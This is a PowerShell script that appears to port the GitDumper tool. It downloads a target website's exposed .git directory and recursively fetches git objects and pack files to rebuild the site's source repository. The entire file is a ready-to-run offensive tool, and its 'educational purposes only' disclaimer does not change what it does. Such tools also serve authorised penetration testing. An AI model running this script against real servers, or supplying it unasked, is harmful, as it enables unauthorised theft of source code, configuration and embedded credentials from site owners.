#!/usr/bin/env pwsh
<#
.SYNOPSIS
    GitDumper in PowerShell – downloads a remote .git directory.

.DESCRIPTION
    This script is a PowerShell port of the Bash GitDumper tool from
    https://github.com/internetwache/GitTools.
    
    It downloads the contents of a remote .git folder and recursively downloads
    referenced objects. Use at your own risk – it is intended for educational purposes only.

.PARAMETER BaseUrl
    The base URL pointing to the remote .git directory (e.g. http://target.com/.git/).

.PARAMETER BaseDir
    The destination folder where the .git folder will be created.

.PARAMETER Other
    Optionally, you can pass the parameter '--git-dir=otherdir' to change the git directory name.
#>

#region Functions

function Init-Header {
    $header = @"
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########
"@
    Write-Host $header
}

function Get-GitDir {
    param(
        [string[]]$Args
    )
    $gitDir = ".git"
    foreach ($arg in $Args) {
        if ($arg -like "--git-dir=*") {
            # Extract everything after '--git-dir=' (10 characters)
            $gitDir = $arg.Substring(10)
            break
        }
    }
    return $gitDir
}

function Start-Download {
    # Add initial static git files to the global queue.
    $initialFiles = @(
        'HEAD',
        'objects/info/packs',
        'description',
        'config',
        'COMMIT_EDITMSG',
        'index',
        'packed-refs',
        'refs/heads/master',
        'refs/remotes/origin/HEAD',
        'refs/stash',
        'logs/HEAD',
        'logs/refs/heads/master',
        'logs/refs/remotes/origin/HEAD',
        'info/refs',
        'info/exclude',
        '/refs/wip/index/refs/heads/master',
        '/refs/wip/wtree/refs/heads/master'
    )
    foreach ($item in $initialFiles) {
        [void]$global:QUEUE.Add($item)
    }

    while ($global:QUEUE.Count -gt 0) {
        $currentItem = $global:QUEUE[0]
        Download-Item -ObjName $currentItem
        # Remove the processed item from the queue
        $global:QUEUE.RemoveAt(0)
    }
}

function Download-Item {
    param(
        [string]$ObjName
    )

    # Check if already downloaded
    if ($global:DOWNLOADED -contains $ObjName) {
        return
    }

    $url = "$global:BASEURL$ObjName"
    $target = Join-Path $global:BASEGITDIR $ObjName

    # Create the target folder if it doesn't exist.
    $targetDir = Split-Path $target -Parent
    if (-not (Test-Path $targetDir)) {
        New-Item -ItemType Directory -Force -Path $targetDir | Out-Null
    }

    try {
        # Download the file using Invoke-WebRequest with a common User-Agent.
        Invoke-WebRequest -Uri $url -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" `
                          -UseBasicParsing -OutFile $target -ErrorAction Stop
    }
    catch {
        Write-Host "[-] Downloaded: $ObjName" -ForegroundColor Red
        [void]$global:DOWNLOADED.Add($ObjName)
        return
    }

    [void]$global:DOWNLOADED.Add($ObjName)

    if (-not (Test-Path $target)) {
        Write-Host "[-] Downloaded: $ObjName" -ForegroundColor Red
        return
    }
    Write-Host "[+] Downloaded: $ObjName" -ForegroundColor Green

    # Initialize an array to hold discovered hashes.
    $hashes = @()

    # If the file appears to be a git object (e.g. objects/ab/cdef...),
    # try to use git cat-file to see if it’s valid.
    if ($ObjName -match "objects/[a-f0-9]{2}/[a-f0-9]{38}") {
        $cwd = Get-Location
        Set-Location $global:BASEDIR

        # Restore hash from the file path by removing "objects" and slashes.
        $hash = $ObjName -replace "objects", "" -replace "/", ""
        
        # Use git cat-file to check for a valid object.
        $gitType = ""
        try {
            $gitType = (& git cat-file -t $hash) 2>$null
        }
        catch {}
        if (-not $gitType) {
            Set-Location $cwd
            Remove-Item $target -Force
            return
        }
        if ($gitType.Trim() -ne "blob") {
            $output = (& git cat-file -p $hash) 2>$null
            if ($output) {
                $hashes += ([regex]::Matches($output, "([a-f0-9]{40})") | ForEach-Object { $_.Value })
            }
        }
        else {
            $output = (& git cat-file -p $hash) 2>$null
            if ($output) {
                # For blobs, we simply scan the output for 40-hex-character strings.
                $hashes += ([regex]::Matches($output, "([a-f0-9]{40})") | ForEach-Object { $_.Value })
            }
        }
        Set-Location $cwd
    }

    # Also scan the downloaded file for any 40-character hexadecimal strings.
    try {
        $fileContent = Get-Content $target -Raw
    }
    catch {
        $fileContent = ""
    }
    $hashes += ([regex]::Matches($fileContent, "([a-f0-9]{40})") | ForEach-Object { $_.Value })

    # For each unique hash found, add the corresponding git object to the queue.
    foreach ($hash in $hashes | Select-Object -Unique) {
        if ($hash.Length -eq 40) {
            $prefix = $hash.Substring(0,2)
            $rest = $hash.Substring(2)
            $newItem = "objects/$prefix/$rest"
            if (-not ($global:QUEUE -contains $newItem)) {
                [void]$global:QUEUE.Add($newItem)
            }
        }
    }

    # Look for pack files in the content.
    $packs = ([regex]::Matches($fileContent, "(pack\-[a-f0-9]{40})") | ForEach-Object { $_.Value }) | Select-Object -Unique
    foreach ($pack in $packs) {
        $packItem1 = "objects/pack/$pack.pack"
        $packItem2 = "objects/pack/$pack.idx"
        if (-not ($global:QUEUE -contains $packItem1)) {
            [void]$global:QUEUE.Add($packItem1)
        }
        if (-not ($global:QUEUE -contains $packItem2)) {
            [void]$global:QUEUE.Add($packItem2)
        }
    }
}
#endregion

#region Main Script

# Check argument count.
if ($args.Count -lt 2) {
    Write-Host "[*] USAGE: http://target.tld/.git/ dest-dir [--git-dir=otherdir]" -ForegroundColor Yellow
    Write-Host "`t--git-dir=otherdir`tChange the git folder name. Default: .git" -ForegroundColor Yellow
    exit 1
}

# Retrieve arguments.
$global:BASEURL = $args[0]
$global:BASEDIR = $args[1]
$global:GITDIR = Get-GitDir -Args $args
$global:BASEGITDIR = Join-Path $global:BASEDIR $global:GITDIR

# Ensure the BASEURL ends with "/<gitDir>/".
if (-not $global:BASEURL.EndsWith("$global:GITDIR/")) {
    Write-Host "[-] /$global:GITDIR/ missing in URL" -ForegroundColor Red
    exit 1
}

# Create the destination git directory if it doesn't exist.
if (-not (Test-Path $global:BASEGITDIR)) {
    Write-Host "[*] Destination folder does not exist" -ForegroundColor Yellow
    Write-Host "[+] Creating $global:BASEGITDIR" -ForegroundColor Green
    New-Item -ItemType Directory -Force -Path $global:BASEGITDIR | Out-Null
}

# Initialize global arrays for the queue and downloaded items.
$global:QUEUE = New-Object System.Collections.ArrayList
$global:DOWNLOADED = New-Object System.Collections.ArrayList

# Print header and start the download process.
Init-Header
Start-Download

#endregion
